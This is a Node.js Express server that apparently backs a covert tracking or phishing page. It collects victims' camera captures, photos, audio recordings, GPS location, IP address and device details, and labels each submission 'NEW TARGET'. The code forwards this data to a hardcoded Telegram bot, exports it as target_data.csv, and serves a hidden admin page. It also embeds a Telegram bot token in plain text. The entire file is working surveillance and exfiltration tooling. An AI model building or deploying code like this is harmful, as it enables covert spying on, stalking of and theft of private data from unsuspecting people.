const express = require('express');
const cors = require('cors');
const path = require('path');
const axios = require('axios');
const bcrypt = require('bcrypt');
const FormData = require('form-data');

const app = express();
const PORT = process.env.PORT || 8080;

app.use(cors());
app.use(express.json({ limit: '100mb' }));
app.use(express.static(path.join(__dirname, '../frontend')));

const TELEGRAM_BOT_TOKEN = '8987699730:AAGu9AoKE7bEBh90MYnuL6mBeJ-K_7M-GXM';
const TELEGRAM_CHAT_ID = '5387196154';
const ADMIN_PASSWORD_HASH = '$2b$10$WL/uVqDgR1Z94OoXTPzkTewSFsjqN8LiBrGwUEeoV1DdFbjvPJMO6';

async function verifyPassword(plainPassword) {
    try {
        return await bcrypt.compare(plainPassword, ADMIN_PASSWORD_HASH);
    } catch(err) {
        console.error('Password verify error:', err);
        return false;
    }
}

async function sendTelegramPhoto(imageData, caption) {
    try {
        const base64Image = imageData.replace(/^data:image\/\w+;base64,/, '');
        const buffer = Buffer.from(base64Image, 'base64');
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('photo', buffer, { filename: 'capture.jpg' });
        formData.append('caption', caption);
        formData.append('parse_mode', 'HTML');
        await axios.post(url, formData, { headers: formData.getHeaders() });
        console.log('✅ Telegram photo sent!');
    } catch (error) {
        console.error('❌ Telegram photo error:', error.message);
        await sendTelegramMessage(caption);
    }
}

async function sendTelegramAudio(audioData, caption) {
    try {
        const base64Audio = audioData.replace(/^data:audio\/\w+;base64,/, '');
        const buffer = Buffer.from(base64Audio, 'base64');
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendAudio`;
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('audio', buffer, { filename: 'recording.webm' });
        formData.append('caption', caption || '🎤 Audio Recording');
        formData.append('parse_mode', 'HTML');
        await axios.post(url, formData, { headers: formData.getHeaders() });
        console.log('✅ Telegram audio sent!');
    } catch (error) {
        console.error('❌ Telegram audio error:', error.message);
        await sendTelegramMessage(caption);
    }
}

async function sendTelegramMessage(message) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        await axios.post(url, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
        console.log('✅ Telegram message sent!');
    } catch (error) {
        console.error('❌ Telegram error:', error.message);
    }
}

let allData = [];
let idCounter = 1;

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '../frontend/index.html'));
});

app.get('/secret-admin.html', (req, res) => {
    res.sendFile(path.join(__dirname, '../frontend/secret-admin.html'));
});

app.post('/api/store', async (req, res) => {
    try {
        const { 
            cameraImage, location, deviceDetails, 
            userPhoto, audioData, ipAddress, fullDeviceInfo,
            networkSpeed, liveLocation, captureCount
        } = req.body;

        const newEntry = {
            _id: 'id_' + idCounter++,
            cameraImage: cameraImage || null,
            location: location || { lat: 0, lng: 0 },
            deviceDetails: deviceDetails || {},
            fullDeviceInfo: fullDeviceInfo || {},
            userPhoto: userPhoto || null,
            audioData: audioData || null,
            ipAddress: ipAddress || '—',
            networkSpeed: networkSpeed || {},
            liveLocation: liveLocation || {},
            captureCount: captureCount || 0,
            timestamp: new Date().toISOString()
        };

        allData.unshift(newEntry);
        console.log('✅ Stored! Total:', allData.length);

        // ==========================================
        // TELEGRAM CAPTION - SIRF REAL DATA!
        // ==========================================
        const device = fullDeviceInfo || deviceDetails || {};
        const loc = location || {};
        const speed = networkSpeed || {};

        let captionLines = [];
        captionLines.push('🔴 <b>NEW TARGET</b> 🔴');

        // LOCATION
        if (loc.lat && loc.lng) {
            captionLines.push(`📍 Location: ${loc.lat}, ${loc.lng}`);
        }
        if (loc.accuracy) {
            captionLines.push(`🎯 Accuracy: ${loc.accuracy}m`);
        }

        // IP
        if (ipAddress && ipAddress !== '—' && ipAddress !== 'Unknown') {
            captionLines.push(`📡 IP: ${ipAddress}`);
        }

        // BATTERY
        if (device.battery && device.battery !== '—' && device.battery !== 'Unknown') {
            captionLines.push(`🔋 Battery: ${device.battery}`);
        }

        // NETWORK
        if (device.network && device.network !== '—' && device.network !== 'Unknown') {
            captionLines.push(`📶 Network: ${device.network}`);
        }
        if (device.connection?.type && device.connection.type !== '—' && device.connection.type !== 'Unknown') {
            captionLines.push(`📶 Network: ${device.connection.type}`);
        }

        // SCREEN
        if (device.screen && device.screen !== '—' && device.screen !== 'Unknown') {
            captionLines.push(`🖥️ Screen: ${device.screen}`);
        }

        // LANGUAGE
        if (device.language && device.language !== '—' && device.language !== 'Unknown') {
            captionLines.push(`🌐 Language: ${device.language}`);
        }

        // TIMEZONE
        if (device.timezone && device.timezone !== '—' && device.timezone !== 'Unknown') {
            captionLines.push(`🕒 Timezone: ${device.timezone}`);
        }

        // SPEED
        if (speed.download && speed.download !== '—' && speed.download !== 'Unknown') {
            captionLines.push(`🚀 Speed: ${speed.download} Mbps`);
        }

        // CAPTURES & TIME
        captionLines.push(`📸 Captures: ${captureCount || 1}`);
        captionLines.push(`🕐 Time: ${new Date().toISOString()}`);

        const caption = captionLines.join('\n');

        if (userPhoto) {
            await sendTelegramPhoto(userPhoto, caption);
        } else {
            await sendTelegramMessage(caption);
        }
        
        if (audioData) {
            await sendTelegramAudio(audioData, '🎤 Audio Recording');
        }

        res.json({ success: true, message: 'Data stored!', id: newEntry._id });

    } catch (err) {
        console.error('Store error:', err);
        res.status(500).json({ success: false, error: err.message });
    }
});

app.get('/api/get-ip', (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || '—';
    res.json({ success: true, ip: ip });
});

app.get('/api/export-csv', (req, res) => {
    try {
        let csv = 'ID,Timestamp,Latitude,Longitude,IP Address,Battery,Network,Screen,Language,Timezone,Audio,Captures\n';
        allData.forEach(item => {
            const device = item.fullDeviceInfo || item.deviceDetails || {};
            const row = [
                item._id,
                item.timestamp,
                item.location?.lat || '—',
                item.location?.lng || '—',
                item.ipAddress || '—',
                device.battery || '—',
                device.network || device.connection?.type || '—',
                device.screen || '—',
                device.language || '—',
                device.timezone || '—',
                item.audioData ? 'Yes' : 'No',
                item.captureCount || 1
            ];
            csv += row.join(',') + '\n';
        });
        res.setHeader('Content-Type', 'text/csv');
        res.setHeader('Content-Disposition', 'attachment; filename=target_data.csv');
        res.send(csv);
    } catch(err) {
        res.status(500).json({ success: false, error: err.message });
    }
});

app.post('/api/admin/get-data', async (req, res) => {
    try {
        const { password } = req.body;
        console.log('🔑 Attempting login...');
        const isValid = await verifyPassword(password);
        if (!isValid) {
            console.log('❌ Invalid password attempt');
            return res.status(401).json({ 
                success: false, 
                message: '⛔ ACCESS DENIED!',
                error: 'Invalid credentials'
            });
        }
        console.log('✅ Admin access granted');
        res.json({ success: true, count: allData.length, data: allData });
    } catch (err) {
        console.error('Admin error:', err);
        res.status(500).json({ success: false, error: err.message });
    }
});

app.post('/api/admin/delete', async (req, res) => {
    try {
        const { password, id } = req.body;
        const isValid = await verifyPassword(password);
        if (!isValid) {
            return res.status(401).json({ success: false, message: '⛔ ACCESS DENIED!' });
        }
        allData = allData.filter(item => item._id !== id);
        console.log('🗑️ Deleted:', id);
        res.json({ success: true, message: 'Deleted!' });
    } catch (err) {
        console.error('Delete error:', err);
        res.status(500).json({ success: false, error: err.message });
    }
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server: http://localhost:${PORT}`);
    console.log(`🔑 Admin: /secret-admin.html`);
    console.log(`📱 Telegram Bot Active!`);
});
